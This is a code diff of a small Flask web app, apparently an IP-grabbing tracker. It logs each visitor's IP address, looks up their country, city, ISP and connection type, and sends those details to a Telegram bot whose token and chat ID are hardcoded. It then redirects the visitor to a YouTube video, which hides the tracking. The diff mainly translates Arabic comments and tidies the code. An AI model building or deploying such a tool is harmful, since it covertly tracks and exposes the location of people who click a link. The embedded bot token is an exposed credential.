@@ -7,8 +7,10 @@ app = Flask(__name__)
 BOT_TOKEN = '8334218363:AAHUtSFy9BvRPd2VpHxDA-pRSzgNPUay3d4'
 CHAT_ID = '5497521471'
 
+# Redirect target
 YOUTUBE_LINK = "https://youtube.com/watch?v=dQw4w9WgXcQ"
 
+# Function to analyze IP
 def analyze_ip(ip):
     try:
         url = f"http://ip-api.com/json/{ip}"
@@ -21,32 +23,40 @@ def analyze_ip(ip):
             isp = data.get("isp", "N/A")
             org = data.get("org", "N/A")
 
-            # فلتر نوع الاتصال (مؤشر تقريبي)
-            if "Mobile" in org or "4G" in org or "LTE" in org or "cellular" in isp.lower():
+            # Detect connection type
+            if "mobile" in org.lower() or "lte" in org.lower() or "cellular" in isp.lower():
                 conn_type = "📱 بيانات موبايل"
-            elif "VPN" in org or "VPN" in isp:
+            elif "vpn" in org.lower() or "vpn" in isp.lower():
                 conn_type = "🛡️ VPN أو بروكسي"
             elif "broadband" in org.lower() or "dsl" in org.lower() or "wifi" in org.lower():
                 conn_type = "📶 WiFi / DSL"
             else:
                 conn_type = "🔍 غير معروف / عام"
 
-            # تجهيز الرسالة
-            msg = f"📥 IP Logged: {ip}\n🌍 Country: {country}\n🏙️ City: {city}\n🏢 ISP: {isp}\n⚙️ Org: {org}\n🔍 Connection: {conn_type}"
+            # Compose message
+            msg = (
+                f"📥 IP Logged: {ip}\n"
+                f"🌍 Country: {country}\n"
+                f"🏙️ City: {city}\n"
+                f"🏢 ISP: {isp}\n"
+                f"⚙️ Org: {org}\n"
+                f"🔍 Connection: {conn_type}"
+            )
             return msg
         else:
             return f"IP Logged: {ip} (No Geo Info)"
-    except Exception as e:
+    except Exception:
         return f"IP Logged: {ip} (Lookup failed)"
 
 @app.route('/')
 def index():
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_ip = raw_ip.split(',')[0].strip()
 
-    # تحليل الـ IP وبناء الرسالة
+    # Analyze and prepare message
     msg = analyze_ip(user_ip)
 
-    # إرسال لتليجرام
+    # Send to Telegram
     telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": CHAT_ID,
@@ -57,6 +67,7 @@ def index():
     except Exception as e:
         print("Telegram Error:", e)
 
+    # Redirect to YouTube
     return redirect(YOUTUBE_LINK)
 
 if __name__ == '__main__':
